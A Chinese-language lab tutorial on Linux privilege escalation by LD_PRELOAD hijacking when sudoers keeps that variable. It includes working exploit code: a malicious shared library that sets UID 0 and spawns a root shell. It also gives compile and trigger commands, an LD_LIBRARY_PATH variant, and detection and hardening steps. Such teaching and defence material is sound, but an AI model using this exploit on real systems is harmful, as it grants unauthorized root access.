# LD_PRELOAD 环境变量劫持

## 原理

LD_PRELOAD 环境变量让动态链接器在程序启动时**预先加载指定 .so 共享库**。
正常情况下 sudo/setuid 程序会清除 LD_PRELOAD（安全机制）；但当 sudoers 配置了
`Defaults env_keep += "LD_PRELOAD"`（或使用 sudo -E），且用户能 sudo 执行任意
程序时，恶意 .so 的构造函数 `_init()` 会在 **root 权限**下执行，实现提权。

## 环境

- 基础镜像：ubuntu:20.04（含 gcc）
- 低权限用户：lowpriv / lowpriv123
- 漏洞配置：sudoers 中 `Defaults env_keep += "LD_PRELOAD"` + `lowpriv ALL=(root) NOPASSWD: /usr/bin/find`

## 复现步骤

利用文件已预置在容器内 /opt/exploits（属主 lowpriv，可读可写可执行），**全程在容器内操作**。

### 第一步：宿主机启动环境（仅这一步在宿主机）

```bash
cd ~/linux-privesc-lab/ld-preload        # Kali 宿主机
docker compose up -d --build            # 构建并启动
docker exec -it ld-preload su - lowpriv   # 进入容器 (密码 lowpriv123)
```

### 第二步：容器内确认漏洞环境

```bash
id                      # uid=1000(lowpriv) gid=1000(lowpriv)
sudo -l                 # 查看漏洞配置
ls -la /opt/exploits/   # 预置的漏洞利用文件 (源码/编译脚本/一键利用)
```

### 第三步：容器内利用（利用文件已预置在 /opt/exploits）

```bash
cd /opt/exploits

# 1. 编译恶意共享库 (evil.c 就在当前目录)
gcc -fPIC -shared -nostartfiles -o /tmp/evil.so evil.c

# 2. 触发: sudo 执行任意程序并注入 LD_PRELOAD
echo 'id; exit' | sudo LD_PRELOAD=/tmp/evil.so /usr/bin/find . -quit
# 预期: uid=0(root) gid=0(root)   提权成功!
```

### 一键利用（容器内）

```bash
cd /opt/exploits && bash exploit.sh
```

## 手动利用（分步教学）

### 第一步：确认漏洞配置

```bash
sudo -l
```
看到 `env_keep += "LD_PRELOAD"` 就是漏洞根源。sudo 默认 env_reset 会清掉
LD_PRELOAD 这类危险变量，管理员手动加进 env_keep 等于**在隔离墙上开了个洞**。

### 第二步：理解动态链接器与 LD_PRELOAD

Linux 程序启动流程：内核 → `ld.so`（动态链接器）→ 加载共享库 → 执行 main()。

`LD_PRELOAD` 告诉 ld.so："**先加载我指定的 .so**"。在 .so 里用
`__attribute__((constructor))` 标记的函数，会在库加载时**自动执行**——
早于目标程序的 main()。

### 第三步：写恶意共享库（evil.c 已在 /opt/exploits）

```c
#define _GNU_SOURCE
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {              // 构造函数: .so 加载时自动执行
    unsetenv("LD_PRELOAD"); // 防止子进程递归加载, 搞坏 shell
    setresgid(0, 0, 0);     // GID -> root
    setresuid(0, 0, 0);     // UID -> root
    system("/bin/bash -p"); // 弹 root shell
}
```

### 第四步：编译

```bash
gcc -fPIC -shared -nostartfiles -o /tmp/evil.so evil.c
```

| 参数 | 作用 |
|:---|:---|
| -fPIC | 位置无关代码，共享库必须 |
| -shared | 生成 .so 共享库而非可执行文件 |
| -nostartfiles | 不链接标准启动文件（我们的 _init 接管） |

### 第五步：触发

```bash
sudo LD_PRELOAD=/tmp/evil.so /usr/bin/find . -quit
```

执行链：sudo 提权到 root → 保留 LD_PRELOAD（env_keep）→ 动态链接器加载
/tmp/evil.so → **_init() 以 root 执行** → root shell。

### 变体：LD_LIBRARY_PATH 劫持

如果 env_keep 保留的是 LD_LIBRARY_PATH：
```bash
ldd /usr/bin/find                 # 查看依赖库
gcc -fPIC -shared -o /tmp/libc.so.6 evil.c   # 伪造同名库
sudo LD_LIBRARY_PATH=/tmp /usr/bin/find . -quit
```

### 检测与防御（蓝队）

```bash
# 检查 sudoers 危险配置
sudo grep -RniE 'env_keep|LD_PRELOAD|LD_LIBRARY_PATH|SETENV' /etc/sudoers /etc/sudoers.d/
# 检查进程环境里的 LD_PRELOAD
cat /proc/<pid>/environ | tr '\0' '\n' | grep -i preload
# 检查加载的可疑 .so
cat /proc/<pid>/maps | grep -E '/tmp/|/dev/shm/'
```

- 保持 `Defaults env_reset`，永远不把 LD_PRELOAD 加进 env_keep
- 不用 SETENV 标签
- 映射 MITRE ATT&CK：T1574.006（动态链接器劫持）

为什么能成功

- env_keep 配置让 sudo 保留 LD_PRELOAD 环境变量
- sudo 以 root 运行 find 时, 动态链接器先加载 /tmp/evil.so
- _init() 构造函数在 root 进程中执行 setuid(0) + 弹 shell

## 注意（踩坑记录）

- 编译必须用 `-nostartfiles` 且函数名必须是 `_init`
- setresuid/setresgid 需要 `#define _GNU_SOURCE`（否则编译警告）
- sudo 默认 env_reset 会清除 LD_PRELOAD, 必须显式 env_keep 或 sudo -E

## 防御

- sudoers 不保留 LD_PRELOAD/LD_LIBRARY_PATH
- 设置 Defaults secure_path


## 扩展教学（网络搜索整理）

### MITRE ATT&CK 映射

本技术对应 **T1574.006: Hijack Execution Flow - Dynamic Linker Hijacking**。
红队视角：动态链接器从不是安全边界，任何让 LD_PRELOAD 跨入 root 进程
的路径都会击穿 sudo 隔离。

### 第二种漏洞配置：SETENV 标签

除了 env_keep，sudoers 规则带 **SETENV** 标签同样可被利用：
```
# /etc/sudoers
lowpriv ALL=(root) SETENV: NOPASSWD: /usr/bin/find
# ^^^^^^ SETENV 允许用户为 sudo 命令设置任意环境变量(包括 LD_PRELOAD)
```
SETENV 比 env_keep 更隐蔽——审计时容易忽略标签名。

### 为什么 SUID 程序免疫（AT_SECURE）

内核执行真 SUID/SGID 程序时设置 AT_SECURE 标志，ld.so 看到该标志会
**直接忽略 LD_PRELOAD**。所以本技术只能走 sudo（sudo 自己的环境处理
决定变量是否存活），不能打 passwd/su 这类真 SUID 程序。

### 检测命令（蓝队）

```bash
# 1. 查 sudoers 危险配置
sudo grep -RniE 'env_keep|LD_PRELOAD|LD_LIBRARY_PATH|SETENV|!env_reset' /etc/sudoers /etc/sudoers.d/

# 2. 查进程环境
cat /proc/<pid>/environ | tr '\0' '\n' | grep -i preload

# 3. 查进程加载的可疑 .so
cat /proc/<pid>/maps | grep -E '/tmp/|/dev/shm/|/home/'

# 4. auditd 规则: 监控带 LD_PRELOAD 的 execve
auditctl -a always,exit -F arch=b64 -S execve -F key=ld_preload_exec
ausearch -k ld_preload_exec | grep -i LD_PRELOAD

# 5. auth.log 中的 sudo 命令行
journalctl -u sudo | grep -i preload
```

### Falco 检测规则（容器环境）

```yaml
- rule: LD_PRELOAD set on privileged exec
  condition: spawned_process and proc.env contains "LD_PRELOAD" and proc.aname[1]=sudo
  priority: WARNING
```

### 防御清单

- 保持 `Defaults env_reset`，永不 env_keep 链接器变量
- 不用 SETENV 标签
- `Defaults secure_path` 固定 PATH
- 文件完整性监控 /lib /usr/lib /etc/ld.so.conf.d

## 验证记录

2026-08-26 真实环境验证：编译后 `echo 'id; exit' | sudo LD_PRELOAD=/tmp/evil.so /usr/bin/find . -quit`
输出 `uid=0(root) gid=0(root)`。复现成功。
